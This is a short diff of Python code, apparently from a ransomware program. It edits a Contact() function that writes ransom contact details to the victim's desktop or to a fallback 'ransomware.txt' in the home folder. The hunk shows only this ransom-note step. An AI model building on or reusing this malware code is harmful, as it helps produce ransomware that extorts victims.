@@ -46,10 +46,10 @@ def Contact():
 
     try:
         with open(desktop, 'w') as file:
-            file.write(info['contact']) 
-    except Exception as e:
+            file.write(info) 
+    except:
         with open(home / 'ransomware.txt', 'w') as file:
-            file.write(info['contact']) 
+            file.write(info) 
 
 
 def Safe_Load(stream) -> dict:
